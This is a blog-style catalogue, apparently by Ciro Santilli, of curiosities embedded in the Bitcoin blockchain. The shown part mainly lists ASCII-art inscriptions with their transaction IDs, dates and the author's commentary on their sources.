# Cool data embedded in the Bitcoin blockchain

↑ **Parent:** [Bitcoin inscription](cryptocurrency.md#bitcoin-inscription)  
🏷️ **Tags:** [The best articles by Ciro Santilli](articles.md), [Ciro Santilli's data projects](ciro-santilli-s-projects.md#ciro-santilli-s-data-projects), [Ciro Santilli's naughty projects](ciro-santilli-s-projects.md#ciro-santilli-s-naughty-projects), [Digital preservation](website.md#digital-preservation), [Inscription (blockchain)](social-technology.md#inscription-blockchain)

<a id="_7"></a>
This is a collection of cool data found in the Bitcoin blockchain using techniques mentioned at: [Section "How to extract data from the Bitcoin blockchain"](cryptocurrency.md#how-to-extract-data-from-the-bitcoin-blockchain). Notably, [Ciro Santilli](ciro-santilli.md) developed his own set of scripts at [https://github.com/cirosantilli/bitcoin-inscription-indexer](https://github.com/cirosantilli/bitcoin-inscription-indexer) to find some of this data. This article is based on data analyzed up to around block 831k (February 2024).

<a id="_8"></a>
Drop some [Bitcoins](cryptocurrency.md#bitcoin) at **3KRk7f2JgekF6x7QBqPHdZ3pPDuMdY3eWR** if you are loaded and like this article in order to support some much needed higher educational reform: [Section "Sponsor Ciro Santilli's work on OurBigBook.com"](sponsor.md).

<a id="_9"></a>
When this kind of non-financial data is embedded into a blockchain some people called an "[inscription](social-technology.md#inscription-blockchain)". The study or "early" inscriptions had been called a form of "archaeology"[https://docs.ordinals.com/overview.html](https://docs.ordinals.com/overview.html)[http://blockchainarchaeology.com/](http://blockchainarchaeology.com/). Since this is a collection of archeological artifacts, we call it a "[museum](science.md#museum)"!

<a id="video-my-bitcoin-inscription-museum-by-ciro-santilli"></a>
**[Video 1](#video-my-bitcoin-inscription-museum-by-ciro-santilli). My Bitcoin inscription museum by Ciro Santilli.** [Source](https://www.youtube.com/watch?v=6XJ6wZBqgUo). Introductory video to this article. Edited from [Aratu Week 2024 Talk by Ciro Santilli: My Best Random Projects](aratu-week-2024-talk-by-ciro-santilli.md).

<a id="_10"></a>
One really cool thing about inscriptions is that because blockchains are huge [Merkle trees](computer-science.md#merkle-tree), it is impossible to censor any one inscription without censoring the entire blockchain. It is also really cool to see people treating the Bitcoin blockchain basically like a global social media feed!

<a id="_11"></a>
Starting on December 2022, [ordinal ruleset inscriptions](#ordinal-ruleset-inscription) took the bitcoin blockchain by storm, and dwarfed in volume all other previous inscriptions. This museum focuses mostly on non-ordinals, though certain specific ordinal topics that especially interest he curators may be covered, e.g. [Ordinal ruleset inscription porn](#ordinal-ruleset-inscription-porn) and [ordinal ASCII art inscription](#ordinal-ascii-art-inscription).

<a id="_12"></a>
[Hidden surprises in the Bitcoin blockchain by Ken Shirriff (2014)](#hidden-surprises-in-the-bitcoin-blockchain-by-ken-shirriff-2014) is a mandatory precursor to this article and contains the most interesting examples of the time. But much happened since Ken's article which we try to cover. This analysis is also a bit more data oriented through our usage of scripting.

<a id="_13"></a>
Artifacts can be organized in various ways:<a id="_14"></a>

<a id="_15"></a>
- chronologically
<a id="_16"></a>
- by [media type](#media-type), e.g. [images](#images) vs [text](#text)
<a id="_17"></a>
- by [themes](#themes) or events, e.g. the [Prayer wars](#prayer-wars) or [Mt. Gox' shutdown](#mt-gox-shutdown)
<a id="_18"></a>
- encoding, e.g. [AtomSea & EMBII](#atomsea-and-embii) vs [raw images](#raw-images)
In this article we've done a mixture of:<a id="_19"></a>

<a id="_20"></a>
- [themes](#themes): if multiple items fall in a theme, we tend to put it there first
<a id="_21"></a>
- then by [media type](#media-type) if they don't fit any specific theme
<a id="_22"></a>
- then by encoding
<a id="_23"></a>
- and finally chronologically within each section
Who said it was easy to be a museum curator!

**Table of contents**

- [Media type](#media-type)
  - [Images](#images)
    - [ASCII art](#ascii-art)
      - [Len Sassaman tribute](#len-sassaman-tribute)
      - [Marijuana plant](#marijuana-plant)
      - [Force of Will](#force-of-will)
    - [Custom encoded images of unknown source](#custom-encoded-images-of-unknown-source)
    - [AtomSea & EMBII](#atomsea-and-embii)
      - [Early AtomSea & EMBII uploads](#early-atomsea-and-embii-uploads)
        - [ILoveYouMore.jpg](#iloveyoumore-jpg)
        - [Nelson-Mandela.jpg](#nelson-mandela-jpg)
          - [Nelson-Mandela.jpg analysis](#nelson-mandela-jpg-analysis)
      - [Interesting AtomSea & EMBII uploads](#interesting-atomsea-and-embii-uploads)
      - [AtomSea & EMBII data format](#atomsea-and-embii-data-format)
      - [bitfossil.org](#bitfossil-org)
    - [Raw images](#raw-images)
      - [cryptograffiti.info](#cryptograffiti-info)
    - [Ordinal ruleset inscription](#ordinal-ruleset-inscription)
      - [ordinals.com](#ordinals-com)
      - [Ordinal ruleset inscription porn](#ordinal-ruleset-inscription-porn)
      - [Technically interesting ordinal](#technically-interesting-ordinal)
        - [Largest ordinal inscription](#largest-ordinal-inscription)
          - [Largest text ordinal inscription](#largest-text-ordinal-inscription)
            - [Ordinal ASCII art inscription](#ordinal-ascii-art-inscription)
              - [We are 256, We are 1](#we-are-256-we-are-1)
        - [Cursed ordinal](#cursed-ordinal)
      - [Ordinal ruleset inscription collection](#ordinal-ruleset-inscription-collection)
        - [OnChainMonkey](#onchainmonkey)
        - [Taproot Wizards](#taproot-wizards)
  - [Text](#text)
    - [Software](#software)
    - [Cute Coinbase messages](#cute-coinbase-messages)
      - [HHTT](#hhtt)
    - [Base58 messages](#base58-messages)
      - [etchablock.com](#etchablock-com)
    - [Eternity Wall](#eternity-wall)
    - [Quotes and threes](#quotes-and-threes)
  - [Encrypted data](#encrypted-data)
- [Themes](#themes)
  - [Prayer wars](#prayer-wars)
  - [Illegal content of block 229k](#illegal-content-of-block-229k)
  - [Porn](#porn)
    - [ASCII porn](#ascii-porn)
  - [Mt. Gox' shutdown](#mt-gox-shutdown)
  - [Protests against larger block sizes](#protests-against-larger-block-sizes)
    - [IRC log dumps](#irc-log-dumps)
  - [503: Bitcoin over capacity](#503-bitcoin-over-capacity)
  - [Rickrolling](#rickrolling)
  - [Halving messages](#halving-messages)
  - [Politics](#politics)
    - [China](#china)
    - [Trump](#trump)
- [Interesting transactions](#interesting-transactions)
  - [The largest transactions in the Bitcoin Blockchain](#the-largest-transactions-in-the-bitcoin-blockchain)
- [Bibliography](#bibliography)
  - [Hidden surprises in the Bitcoin blockchain by Ken Shirriff (2014)](#hidden-surprises-in-the-bitcoin-blockchain-by-ken-shirriff-2014)
  - [A Quantitative Analysis of the Impact of Arbitrary Blockchain Content on Bitcoin by Matzutt et al. (2018)](#a-quantitative-analysis-of-the-impact-of-arbitrary-blockchain-content-on-bitcoin-by-matzutt-et-al-2018)
  - [Messages from the mines](#messages-from-the-mines)
  - [Bitcoin Burn Addresses: Unveiling the Permanent Losses and Their Underlying Causes](#bitcoin-burn-addresses-unveiling-the-permanent-losses-and-their-underlying-causes)
- [Other blockchains](#other-blockchains)
- [Incoming links](#incoming-links)

## Media type

↑ **Parent:** [Cool data embedded in the Bitcoin blockchain](cool-data-embedded-in-the-bitcoin-blockchain.md)

### Images

↑ **Parent:** [Media type](#media-type)  
🏷️ **Tags:** [Image](technology.md#image)

<a id="_25"></a>
Besides [ASCII art](#ascii-art), the huge majority of images is encoded with the [AtomSea & EMBII](#atomsea-and-embii) system/format. All images in that system will be documented in that section.

#### ASCII art

↑ **Parent:** [Images](#images)  
🏷️ **Tags:** [ASCII art](#ascii-art)

<a id="_27"></a>
There are a few dozen [ASCII arts](art.md#ascii-art) in the blockchain.

<a id="_28"></a>
[ASCII porn](art.md#ascii-porn) is listed at [Section "ASCII porn"](#ascii-porn).

<a id="_29"></a>
Almost all of them are copy pastes of stuff present elsewhere, or boring high resolution ones auto-generated from images. But hey, it's still fun to see.

<a id="_30"></a>
<a id="_31"></a>
- [block 229417](https://www.blockchain.com/explorer/blocks/btc/229417) (2013-04-03) has a cute one liner sword [miner message](social-technology.md#miner-message) by [HHTT](#hhtt):<a id="_32"></a>

  ```
  ./SockThing/HHTT/o()xxxx[{::::::::::::::::::::::::::::::::::>
  ```
<a id="_33"></a>
- 5acc5293506c65d346d6ca171d8e8b73b39b3f99fb16a98cc7f3ce9dbe27a87c ([2014-03-10](https://www.blockchain.com/explorer/transactions/btc/5acc5293506c65d346d6ca171d8e8b73b39b3f99fb16a98cc7f3ce9dbe27a87c)) goes straight to the point:<a id="_34"></a>

  ```
  +----+
  |fuck|
  +----+
  ```
<a id="_35"></a>
- [tx 9f17f3ce43019c24baa6d679edfdddeada856f617cd9c1f6008d49be4542b768](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0301.txt#L105) block 301412 ([2014-05-18](https://www.blockchain.com/explorer/transactions/btc/9f17f3ce43019c24baa6d679edfdddeada856f617cd9c1f6008d49be4542b768)) TODO wft, what/who is "poutine". [Cthulhu](https://ourbigbook.com/go/topic/cthulhu) is of course the fictional (?) entity created by writer H. P. Lovecraft.<a id="_36"></a>

  ```
    _--------.
   /    ~~~~~~\                     p o u t i n e
  (_   ~~~@~~@|     Cthulhu wants your bitcoin/dogecoin, plz donate
   \   ~~//|\\\  |
    \   \|||/\\\_/
    /   /|//_/|/__   BTC : 1JsJs5d6E5SmJSGUiQ12uF1GDZxTCUWvf
   /    \_\ \|\|     DOGE: D93mn1utTc7REQQPjQSjFf9Boupm32gw88
  ```

  There were a few small donations: [https://www.blockchain.com/explorer/addresses/BTC/1JsJs5d6E5SmJSGUiQ12uF1GDZxTCUWvf](https://www.blockchain.com/explorer/addresses/BTC/1JsJs5d6E5SmJSGUiQ12uF1GDZxTCUWvf)
<a id="_37"></a>
- [tx 7b537ad012439c6306dd74e13ba9c20926d68d04fc0c6da2fc81a8eb8f9ea017](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0322.txt#L652) block 322917 ([2014-09-28](https://www.blockchain.com/explorer/transactions/btc/7b537ad012439c6306dd74e13ba9c20926d68d04fc0c6da2fc81a8eb8f9ea017)) via [cryptograffiti.info](#cryptograffiti-info) contains the ASCII art of cat:<a id="_38"></a>

  ```
           /\_/\
      ____/ o o \
    /~____  =
  = /
   (______)__m_m)
  ```
<a id="_39"></a>
- <a id="image-ascii-art-of-the-winklevoss-twins"></a>
  <img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/ascii-art/09a5d5aaecdce1757e6ec713cc8a2201abca9acdb6fbadc7760e831cdad3d680.png" alt="" height="800">

  **[Figure 1](#image-ascii-art-of-the-winklevoss-twins). ASCII art of the Winklevoss twins**. <a id="_40"></a>
  [tx 09a5d5aaecdce1757e6ec713cc8a2201abca9acdb6fbadc7760e831cdad3d680](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0323.txt#L363) ([2014-10-01](https://www.blockchain.com/explorer/transactions/btc/09a5d5aaecdce1757e6ec713cc8a2201abca9acdb6fbadc7760e831cdad3d680)) high resolution image of the [Winklevoss twins](social-technology.md#winklevoss-twins) wearing suites. They had a [big and later catastrophic involvement with Bitcoin](social-technology.md#winklevoss-twins-involvement-in-bitcoin). Followed by the message:<a id="_41"></a>


  > if you like it, leave a tip: 1MDBHLGV7WX9viRG9X4LfDQfCX8oZ9w

  TODO locate exact source photograph if one exists. The coin-like image behind them on the background appears to represent the statue of liberty.  
  The tip address appears to be cropped and is incorrect, ooops. 777db7bfbea2c525d5adb05a8fbf47736e2311492f4614e5d38ab199b4bbfac2 give the likely correct version of it "1MDBHLgv7WX9viRG9X4LfDQfCX8oZ9wviC".

  <a id="_42"></a>
  The same address that funds this transaction [1Jhf86XdHsAQYKRZjQ1CuJCnyUqVKnasEW](https://www.blockchain.com/explorer/addresses/btc/1Jhf86XdHsAQYKRZjQ1CuJCnyUqVKnasEW) later also goes on to directly fund other "if you like it leave a tip" [ASCII arts](#ascii-art):<a id="_43"></a>

  <a id="_44"></a>
  - [Figure 2. "777db7bfbea2c525d5adb05a8fbf47736e2311492f4614e5d38ab199b4bbfac2"](#image-777db7bfbea2c525d5adb05a8fbf47736e2311492f4614e5d38ab199b4bbfac2)
  <a id="_45"></a>
  - [Figure 5. "Warren Buffet"](#image-warren-buffet) at 0fc0c50e410b62ee3a316135711116db6b4e728841c976f29ab85e2a41e0dcc3
  This was [noticed by I\_\_\_\_felix\_\_\_\_I on Twitter](https://x.com/I____felix____I/status/1905289865064743231). That same address also funds [tx 61e9a034f5bf4f34afb553c0ce041be425d1e38f5026ed32a38a7b2a9516d119](https://www.blockchain.com/explorer/transactions/btc/61e9a034f5bf4f34afb553c0ce041be425d1e38f5026ed32a38a7b2a9516d119) block 325026 (2014-10-12) which contains a quick ASCII message referencing the images:<a id="_46"></a>

  ```
  That's not, what the blockchain's for - BTC hall of fame.
  Yeah, yeah, I know. I couldn't help myself
  ```
  and [tx 736026e3a8f41f186690e15168345fec54e19bab6d3127dc27e2976d0c1e11a4](https://www.blockchain.com/explorer/transactions/btc/736026e3a8f41f186690e15168345fec54e19bab6d3127dc27e2976d0c1e11a4) block 324742 (2014-10-10) which contains another message though that one is less clear:<a id="_47"></a>

  ```
  thanks, BM-2cTgtmfRnk9B2eZjZEpiaYoTWHVG1J4wyH
  G+uWd832gZrF416G64HKJ8tj5Foa95qOc8pmlPI5dRkmLB0PwtfB3U54JIqYs33+gj9+N7DJta2Pf7LsXH3DcM8=
  ```

  ---
<a id="_48"></a>
- [tx e577e60f4008a00175ef3f3266f052949440009b2ac65e4957da114db29bf96d](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0328.txt#L544) ([2014-11-03](https://www.blockchain.com/explorer/transactions/btc/e577e60f4008a00175ef3f3266f052949440009b2ac65e4957da114db29bf96d)) `@jamesmorgan`. Possibly this Twitter account: [https://twitter.com/jamesmorgan](https://twitter.com/jamesmorgan) but it was suspended as of January 2024. It had only a single archive from 2008 at: [https://web.archive.org/web/20081007152024/http://twitter.com/JamesMorgan](https://web.archive.org/web/20081007152024/http://twitter.com/JamesMorgan) but nothing special about it besides the 2008 vibe of Twitter CSS:<a id="_49"></a>

  ```
     _____     __
    / ___ \   |__|____    _____   ____   ______ ____   _____   ___________  _________    ____
   / / ._\ \  |  \__  \  /     \_/ __ \ /  ___// ___\ /     \ /  _ \_  __ \/ ___\__  \  /    \
  <  \_____/  |  |/ __ \|  Y Y  \  ___/ \___ \/ /_/  >  Y Y  (  <_> )  | \/ /_/  > __ \|   |  \
   \_____\/\__|  (____  /__|_|  /\___  >____  >___  /|__|_|  /\____/|__|  \___  (____  /___|  /
          \______|    \/      \/     \/     \/_____/       \/            /_____/     \/     \/
  ```
<a id="_50"></a>
- <a id="image-777db7bfbea2c525d5adb05a8fbf47736e2311492f4614e5d38ab199b4bbfac2"></a>
  <img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/ascii-art/777db7bfbea2c525d5adb05a8fbf47736e2311492f4614e5d38ab199b4bbfac2.png" alt="" height="800">

  **[Figure 2](#image-777db7bfbea2c525d5adb05a8fbf47736e2311492f4614e5d38ab199b4bbfac2). 777db7bfbea2c525d5adb05a8fbf47736e2311492f4614e5d38ab199b4bbfac2**. ([2014-10-12](https://www.blockchain.com/explorer/transactions/btc/777db7bfbea2c525d5adb05a8fbf47736e2311492f4614e5d38ab199b4bbfac2)). Associated text:<a id="_51"></a>
  > if you like it, leave a tip: 1MDBHLgv7WX9viRG9X4LfDQfCX8oZ9wviC

  Portrait of a young man. TODO identify. Possibly [Roger Ver](https://ourbigbook.com/go/topic/roger-ver). 1MDBHLgv7WX9viRG9X4LfDQfCX8oZ9wviC was tipped twice so far: [https://www.blockchain.com/explorer/addresses/btc/1MDBHLgv7WX9viRG9X4LfDQfCX8oZ9wviC](https://www.blockchain.com/explorer/addresses/btc/1MDBHLgv7WX9viRG9X4LfDQfCX8oZ9wviC) for 0.00240 BTC and 0.02490000 BTC in 2014. Change was returned down the middle at output 97 back to sending address 1Jhf86XdHsAQYKRZjQ1CuJCnyUqVKnasEW.

  ---
<a id="_52"></a>
- [tx c6df8850871fce6c8764af2a0a4155241fc987db57abd8c9ead0165895e1ccc4](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0328.txt#L589) ([2014-11-04](https://www.blockchain.com/explorer/transactions/btc/c6df8850871fce6c8764af2a0a4155241fc987db57abd8c9ead0165895e1ccc4)): TODO what company is this the logo of? It seems very familiar, [Ciro Santilli](ciro-santilli.md) has certainly seen it before but can't remember where...:<a id="_53"></a>

  ```
                   `-:+syhhhhhhyo/-.
                ./sdmmmmmmmmmmmmmmddy/.`
              :sdmmmmmdddddhhysyhhddddho-`
            -ydmmmmddddddddddhhyso++yhddh/``
           +dmmmdddddddyso++/++shdy+:/+ydho``
          +dmmdddddhhy:``       ./sh/.-/yhho`
         -dmmdddhhhy/`            `/y/`./yho-
        .hmddddhhhs:                :h.`::/-:`
        ydmmmdhhhy`                  s+ .` `.-
        ymmmmdhhh+                   /o  @R*.
        /mmmmdhhhs`                  ..
        `hmmmdhhhh/
         ommmdddhhh-
         .hmmmddhhhh+-`
          .hmmmmddhhhhso+:----:+o+/:-
           :smmmmdddhhhhhhhhhhhhdddhh/
           ` -sdmmmmddddddddddddddmmmd-
               .odmmmmmmmmmmmmmmmmmmd:`
                 .-:odhmmmmmNNNNmdo/.
                     ``-sooosyho``

  -JGM
  ```
<a id="_54"></a>
- <a id="code-the-hashling"></a>
  ```
  The Hashling

    /\|--|/\
    /\|OO|/\
    /\|--|/\

  @BraveTheWorld
  @petertoddbtc
  ```
<a id="_61"></a>
- [tx 57a4edce05dee9012ff5991532e9aa02aef82ee8d3ebecb9f833c12bfbc708fe](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0334.txt#L741) ([2014-12-19](https://www.blockchain.com/explorer/transactions/btc/57a4edce05dee9012ff5991532e9aa02aef82ee8d3ebecb9f833c12bfbc708fe)) via [cryptograffiti.info](#cryptograffiti-info) "MERRY CHRISTMAS! & HAPPY NEW YEAR!!" with a really ugly father Christmas with gift bag. Reproduced at: [https://asciiart.website/index.php?art=holiday/christmas/santa](https://asciiart.website/index.php?art=holiday/christmas/santa) where is is credited From: `Heather Classen <classen@aware.com>`, Date: 22 Dec 1994 17:00:58 -0600<a id="_62"></a>

  ```
    MERRY CHRISTMAS!              __ _ __ ___
          &                  _ __'.:;.:;.:;.:`
    HAPPY NEW YEAR!        _'.:;.:;.:;.:;.:;.:`
                          '.:. , :`,.,`;'/`__ _` _
                          '..:;.;'.:,.;.:;\      (_)
                        -__ --_-_-_-__---_-)
                      (                    )
    ____               (_- -__-_-__-____-__-)
  /####\ /\            |  ,~~~'  `~~~.   %@
  |#####\#|             )  ><@>  <@><    %@%
  |#######|            /      /          %@p
    \######|            ( *   (_c)   * )  % %      .vvvvvvvv.
    |#####|             \ '%@%@%@%@`, %@%@       .vvvvvvvvvv.
    /#####\         _ _ d%@ `----' @%@%@ \ _ _ _.vvvvvvvvvvvvv.
    ~~~~~~~       ':;.;%@@%@%@%@%@%@@%p  /.:;.:;vvvvvvvvvvvvvvv.
      `.:;.'     ':;.;%@@%@%@@%@%@%@%@ :: ____vvmvvvvvvvvvvvvvvvv.
      :.:;.:`   ':;.:d%@%@%@%@%@%@@%@%.:;/####\/\.:;\mvvvvvvvvvvvv
      :.:;.:;` ';.;;.%@%@@%@%@@%@%@%@p.:;|#####\#|.:;\mvvvvvvvvvvvv.
      :.:;.:;./;.;;.;%@%@%@%@%@%@%@%@ ::.'\######|.:;\mnvvvvvvvvvvvv
      :.:;.:;.|:.;.;.% %@%@%@%@%@% % :  mvv\#####|.:;.\mnvvvvvvvvvvv
      :.:;.:;/:;.;.:;.q%@%@@%@%@ %p.:;vv%mv|#####\.:;.\mnvvvvvvvvvv
      :.:;.:;|:;.:;.;;;%@%@@% %.:;.:;.vmnv. ~~~~~~ .:;.|mvvvvvvvvvv.
      :.:;.:/.:;.:;.:;.: o  .:;.:;.:;.vv.:;/.:;.:;\.:;.|mnvvvvvvvvv.
      `.:;.|:;.:;;;.:;.    .:;;;;;;;;;;;;;|.:;.:;.\.:;\mnvvvvvvvv.
        `::/:;;;.:;;.:; o  .:;.;;.:;;;.:;.:|.:;.:;.:\.:;\mnvvvvvnm
          ;.:;;.:;;.:     :;;;.:;.:;.:;.:;\.:;.:;.:;.:;|mnvvvnm.
          :::;.:;.:;. o  ..:;.:;.:;;;;.;;;;\.:;.:;.:;.:|mnvvnm.
          :::;.:;;.:     .:;;;;;;;;.:;.:;;;|.:;.:;.:;./mmvnm.
          ;.:;.:;.;. o   .:;.;.:;;.:;.:;.:;.\________/mmmnm.
          :.:;;;.;;;     .:;;.:;.:;;.:;.:;.:;.;.:;;;;`mmnn
            `#######HHOHHH###########################
            #######HHOHHH###########################
            '::;;;.;; o  :;;;.:;.:;;.;;;;;;;;;;;.:;.:`  H.Classen
  ```
<a id="_63"></a>
- <a id="_64"></a>
  [tx 69708943906eb32a320a5a450fed450b0f14b4e475a98bc74615962b68a0bc83](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0340.txt#L227) ([2015-01-24](https://www.blockchain.com/explorer/transactions/btc/69708943906eb32a320a5a450fed450b0f14b4e475a98bc74615962b68a0bc83)) via [cryptograffiti.info](#cryptograffiti-info) "All Glory to he HYPNO TOAD" signed "SSt" has an ASCII art of HypnoToad, a ficticius mind controlling frog creature from [Futurama](television-series.md#futurama): [Fandom](https://futurama.fandom.com/wiki/Hypnotoad#Episodes), [KnowYourMeme](https://knowyourmeme.com/memes/hypnotoad). The same ASCII art can be seen for example at: [http://www.gotfuturama.com/Multimedia/AsciiArt/HypnoSebastian.shtml](http://www.gotfuturama.com/Multimedia/AsciiArt/HypnoSebastian.shtml)<a id="_65"></a>

  ```````
        ,'``.._   ,'``.
      :,--._:)\,:,._,.:       All Glory to
      :`--,''   :`...';\      the HYPNO TOAD!
        `,'       `---'  `.
        /                 :
      /                   \
    ,'                     :\.___,-.
    `...,---'``````-..._    |:       \
      (                 )   ;:    )   \  _,-.
      `.              (   //          `'    \
        :               `.//  )      )     , ;
      ,-|`.            _,'/       )    ) ,' ,'
    (  :`.`-..____..=:.-':     .     _,' ,'
      `,'\ ``--....-)='    `._,  \  ,') _ '``._
  _.-/ _ `.       (_)      /     )' ; / \ \`-.'
  `--(   `-:`.     `' ___..'  _,-'   |/   `.)
      `-. `.`.``-----``--,  .'
        |/`.\`'        ,','); SSt
            `         (/  (/
  ```````

  <a id="image-hypno-toad"></a>
  ![](https://web.archive.org/web/20231209170108im_/https://i.kym-cdn.com/photos/images/newsfeed/002/023/077/166.png)

  **[Figure 3](#image-hypno-toad). Hypno toad**. Off-chain reference image for the [ASCII art](#ascii-art)
<a id="_66"></a>
- [tx 0913d8125167f728cec1b95d27e6fc62a7a45af35eecfefd3b5000e367ee1468](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0341.txt#L139) ([2015-02-01](https://www.blockchain.com/explorer/transactions/btc/0913d8125167f728cec1b95d27e6fc62a7a45af35eecfefd3b5000e367ee1468)) via [cryptograffiti.info](#cryptograffiti-info): [ASCII typeface](art.md#ascii-typeface) add for an unsuccessful cryptocurrency with a link to its homepage [http://zeit-coin.net](http://zeit-coin.net):<a id="_67"></a>

  ```
           _ _            _
          (_) |          (_)
   _______ _| |_ ___ ___  _ _ __
  |_  / _ \ | __/ __/ _ \| | '_ \
   / /  __/ | || (_| (_) | | | | |
  /___\___|_|\__\___\___/|_|_| |_|
  http://zeit-coin.net
  ```
<a id="_68"></a>
- [tx 43b0bb63fc50ad1edbb17486dc44825e4dd642a952c699cc13958e010ba3d8a5](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0345.txt#L100) ([2015-02-26](https://www.blockchain.com/explorer/transactions/btc/43b0bb63fc50ad1edbb17486dc44825e4dd642a952c699cc13958e010ba3d8a5)) has a star of David. Possibly related news from the day prior: [https://www.theguardian.com/world/2015/jan/25/jewish-leaders-europe-legislation-outlawing-antisemitism](https://www.theguardian.com/world/2015/jan/25/jewish-leaders-europe-legislation-outlawing-antisemitism) "Jewish leaders call for Europe-wide legislation outlawing antisemitism"<a id="_69"></a>

  ```
             /\
            /  \
           / /\ \
  ________/ /__\_\________
  \  ____/ /___________  /
   \ \  / /      \ \  / /
    \ \/ /        \ \/ /
     \ \/          \ \/
     /\ \          /\ \
    / /\ \        / /\ \
   / /__\_\______/ /__\ \
  /_____________/ /______\
          \ \  / /
           \ \/ /
            \  /
             \/

      HELLO FROM ZOG
  ```

  The signature however appears ironic and could stand for "[Zionist Occupation Government](https://en.wikipedia.org/wiki/Zionist_Occupation_Government_conspiracy_theory)"
<a id="_70"></a>
- <a id="code-muy-feliz-cumple-manu"></a>
  ```
  Muy feliz cumple Manu! ---- The Fantastic Four Gang :-D
  ~?O8O7?I$O8888OOZZ$$$7?=~::::::::::::$$8ODZZZ7I,.....,8D88O88O88$I?=7ZO88DDDNDNN
  7888DD888888888OOZZZ$$I+=~:::::~IONNNNNNMNNNMMNMN8~:.,:+888D88O$$$Z$OZOO8DDNNNNM
  88DDDDD8D88888888OZZZZI?=~::~+ODNMNNNMNMMMMMMMMMMNNND~,:?D8D88Z$$$7Z$ZZO8DNNNNNN
  8DDDDNDDD8888OOO8OOOOZ7?=~~+DDDND8NDD88NNNMNMNNNMMMMMND?ODDD888ZOOOOOO88DNNNNNDD
  DD8DDDDDDD88O8O8OOOOOO7?++DDDDD8DDDDD8DDND888NDDNNMMMNMNZ$8DDDDD8DDDDDDDNNNNNNND
  88D888888D88888O88O8OZ$7O8DD8DDNNNDDDDDND8888NDDDNNMNNNNDDO8888DD8DDDDDDNNNNNNND
  88D888888888888888888OZZO88DNDDDDD8D88OOOOO8DDNDNDNNNNNDDDOI+?$88D88D8DDNNNNNNNN
  88D8888D88888888D8D8DO$O8DDNDZ77I???+?++++++IZO8O8O888OOD8D$,,,~Z8OO888DDDNNNNDD
  DDD8888888DDDDDDDDDD8ZO8DDD8$I??+++===~~~~::~~=+===+?I$Z8888=..,7$OOOZO8DDNNNNDD
  888D88DDD888DDDDDDD8ZO8DDDDO7?+++++=~~~~~:~:::::::::::~~+$8D$..:78OOOZO88DDNNDDD
  88O888D88OOOO8DD8DD$888DDNDZ7?+?+?++==~~~~:::::::::::,::~=88DI,+88888OOO88DD888O
  O88888DDOOOOOO88DD8Z88NDNNOZ7???+++===~~~::::::::::::::::~$O88OO8888DD8O888OZZZO
  88O8D8888OZZO8O88DOODDNDDD8OI????++===~~:~::::::::::::::::?ZOOOOOO8OD8DDDDOOOZ7$
  88O8O888O8OOOO88DDO8D8NNNN8O7III?++===~~~:::::::::::::::::?ZOZOZOOO8DDDDDD8877$Z
  8O8888D8O8DDDDDDDDO8NDDDNNZ7I???+===~=~~~~~::::::::::::::~?OZZZ888D8D8888888$$$$
  8O8D88OO88DDDNNNNDZDNNDDN87I?????I$7???++===:~~~~~~::::,:=IO$$O88DD8D888D8DDZ$$$
  8888OOZZZO88DDDDDDO8NDDNDZII??7Z8O88NNNDOI?++=++++++==~::=$8ZZ88DDN8DD8DDDHACKER
  DD88O$$7$ZOOOO88D87ODDDND7??I7$$7777$OOO8O$?+=+$88DDD8O7:~$8$$88DNDNNNDDNNNNNNND
  DDD8O$77$$ZZOOO8DIOZZ8DNZ???7$ZODDNMMI8$8ZI=~:+IZOZ7II+=?=78$$O8NDNNNNNDNNNNNNDD
  DDD8OZZ$ZZOOOO8ODI$7$O8D????III7ZZ$$7IIII77=::+?7OZNDOZ=?~IO7Z8DDDDDDNNNDNNNNDDD
  DNDD88OO88DD88DDNI$?I$OZ??????????+++?+??II+~:==?77$7???+~=$+7DNDDDDDDDDNDDDND88
  NNDNNDDDDNDDNDNDD$I?O8IIII??++++++++===+??I+:::~=++=++~~~:=77ZNNDDDDDDDDDDDDD888
  DDNDDDDNDDNDDDDDNNII77I?II???+====~=~==+???=::::~:~~=~~:::=$+NNDDDDDNDDDDDDDDD88
  NNNNNDNNNNNDDDDDDD??+7??I??I??+==~~===+I??+~:::~::~:~~::::~?=DDNDDDDDNNDDDDDDD8D
  NNNNNNNNNNDDDNNDDN$?I?IIIIIIII??=+=+?I$I+I?=~~::==~::::::~=~NDDNDDDDNDDDDDDDD888
  NNNNMNNNNNNNNNNNNNNO??I$I?II777I?+??777$8D8$?+NO=+=~::::~~~?NNNNNDNNNNNNNDDDD8O8
  NNNNMMMMMMNNNNNNNNDNN8$ZI?II7$$7I7I77?I7ZZOO$I+==++=~~:~=~:MMNNNNNNNNNNNNNDDD8OO
  NNNMMMMMMMMNMNNNNNNNNDO7??III7$777I7I7IIII$$$?+=~=?====~~:+MMNMMMNMMMMNNNDDD888O
  NMNMMMMMMMMMMMMMNMNNNNDI??IIII$7I?I$$77$7I+=~~~~=?I==+==+?MMMMMMMMMMMMNNDDD8888O
  NMMMMMMMMMMMMMMMMMMMNND??IIIIIIII?+?8O+I~=~I=IZZ?I$?+=+=8MMMMMMMMMMMMMNNDD888888
  NMMMMMMMMMMMMMMNMMMMMNN??I7777I77I=+?III+~:~:,~+?+I+++==MMMMMMMMMMMMMMMDDDDDDDDD
  MNMMMMMMMMMMMMMMMMMMNNN?I777777I7I??++?I?++=~~=~:~+=+++IMMMMMMMMMMMMMMMMNNNNMMMM
  MMMMNNNNNMMMMMMMMMMMNMM?I77777II77I???++?IIII+~~:~===++MMMMMMMMMMMMMMMMMMMMMMMMM
  MMMMMMMMMMMMMMMMMMMMMMN+II7$7$$77III???++++===~~~~=+++MMMMMMMMMMMMMMMMMMMMMMMMMM
  MMMMMMMNMMMMMMMNMMMMMMN??I77$7$$7$7I?+++==~~~~~~~~=+?MMMMMMMMMMMMMMMMMMMMMMMMMMM
